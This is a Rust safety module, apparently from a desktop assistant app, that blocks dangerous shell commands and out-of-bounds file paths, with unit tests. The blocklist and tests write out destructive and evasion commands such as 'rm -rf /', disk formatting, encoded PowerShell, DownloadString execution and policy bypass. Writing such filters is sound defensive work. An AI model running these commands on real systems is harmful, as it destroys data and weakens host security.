use anyhow::{bail, Result};

/// Patterns that are always blocked regardless of permission level
const BLOCKED_COMMAND_PATTERNS: &[&str] = &[
    "rm -rf /",
    "format c:",
    "del /s /f /q c:\\",
    "rd /s /q c:\\",
    "shutdown /",
    "reg delete hklm",
    "bcdedit",
    "diskpart",
    "net user administrator",
    "powershell -enc",       // Encoded payloads
    "invoke-expression",     // Alias iex
    "downloadstring",        // Web download + exec pattern
    "bypass",                // ExecutionPolicy bypass
];

const MAX_COMMAND_LEN: usize = 2048;

/// Check a command string against the safety blocklist.
pub fn check_command(command: &str) -> Result<()> {
    if command.len() > MAX_COMMAND_LEN {
        bail!("Commande trop longue ({} chars > {} max)", command.len(), MAX_COMMAND_LEN);
    }

    let lower = command.to_lowercase();
    for pattern in BLOCKED_COMMAND_PATTERNS {
        if lower.contains(pattern) {
            bail!("Commande bloquée par politique de sécurité (pattern: '{pattern}')");
        }
    }

    Ok(())
}

/// Allowed filesystem root paths (expandable in settings).
/// For MVP: only user home directories.
pub fn check_path(path: &str) -> Result<()> {
    let normalized = path.replace('\\', "/").to_lowercase();

    // Prevent path traversal
    if normalized.contains("../") || normalized.contains("..\\") {
        bail!("Chemin non autorisé: traversal détecté");
    }

    let user_profile = std::env::var("USERPROFILE")
        .unwrap_or_default()
        .replace('\\', "/")
        .to_lowercase();

    let temp = std::env::temp_dir()
        .to_string_lossy()
        .replace('\\', "/")
        .to_lowercase();

    let allowed = [
        user_profile.as_str(),
        temp.as_str(),
    ];

    if !allowed.iter().any(|a| !a.is_empty() && normalized.starts_with(a)) {
        bail!("Chemin non autorisé: {path}. Seuls les dossiers utilisateur et temp sont accessibles.");
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Mutex;

    // check_path lit USERPROFILE : on sérialise les tests qui mutent l'env
    // pour éviter les courses entre threads de test.
    static ENV_LOCK: Mutex<()> = Mutex::new(());

    // ─── check_command ─────────────────────────────────────────

    #[test]
    fn command_allows_benign() {
        assert!(check_command("git status").is_ok());
        assert!(check_command("cargo build --release").is_ok());
        assert!(check_command("Get-ChildItem C:\\Users").is_ok());
    }

    #[test]
    fn command_blocks_destructive_patterns() {
        for cmd in [
            "rm -rf /",
            "format c:",
            "del /s /f /q c:\\",
            "rd /s /q c:\\",
            "shutdown /s /t 0",
            "reg delete hklm\\software",
            "bcdedit /set testsigning on",
            "diskpart /s script.txt",
            "net user administrator P@ss",
        ] {
            assert!(check_command(cmd).is_err(), "aurait dû être bloqué: {cmd}");
        }
    }

    #[test]
    fn command_blocks_powershell_evasion() {
        for cmd in [
            "powershell -enc SQBFAFgA",
            "Invoke-Expression $payload",
            "(New-Object Net.WebClient).DownloadString('http://x')",
            "powershell -ExecutionPolicy Bypass -File x.ps1",
        ] {
            assert!(check_command(cmd).is_err(), "aurait dû être bloqué: {cmd}");
        }
    }

    #[test]
    fn command_blocklist_is_case_insensitive() {
        assert!(check_command("RM -RF /").is_err());
        assert!(check_command("FORMAT C:").is_err());
        assert!(check_command("Invoke-EXPRESSION x").is_err());
    }

    #[test]
    fn command_rejects_overlong() {
        let at_limit = "a".repeat(MAX_COMMAND_LEN);
        assert!(check_command(&at_limit).is_ok());
        let over = "a".repeat(MAX_COMMAND_LEN + 1);
        assert!(check_command(&over).is_err());
    }

    // ─── check_path ────────────────────────────────────────────

    #[test]
    fn path_blocks_traversal() {
        let _g = ENV_LOCK.lock().unwrap();
        std::env::set_var("USERPROFILE", "C:\\Users\\testuser");
        assert!(check_path("C:\\Users\\testuser\\..\\Windows\\evil.dll").is_err());
        assert!(check_path("C:/Users/testuser/../../secret").is_err());
    }

    #[test]
    fn path_allows_user_profile_and_temp() {
        let _g = ENV_LOCK.lock().unwrap();
        std::env::set_var("USERPROFILE", "C:\\Users\\testuser");
        assert!(check_path("C:\\Users\\testuser\\Documents\\note.txt").is_ok());
        // Insensible à la casse et aux séparateurs
        assert!(check_path("c:/users/TESTUSER/x.txt").is_ok());

        let temp_file = std::env::temp_dir().join("catdesk-test.txt");
        assert!(check_path(&temp_file.to_string_lossy()).is_ok());
    }

    #[test]
    fn path_blocks_outside_allowed_roots() {
        let _g = ENV_LOCK.lock().unwrap();
        std::env::set_var("USERPROFILE", "C:\\Users\\testuser");
        assert!(check_path("C:\\Windows\\System32\\cmd.exe").is_err());
        assert!(check_path("C:\\Users\\autre\\doc.txt").is_err());
        assert!(check_path("D:\\data\\x.txt").is_err());
    }
}
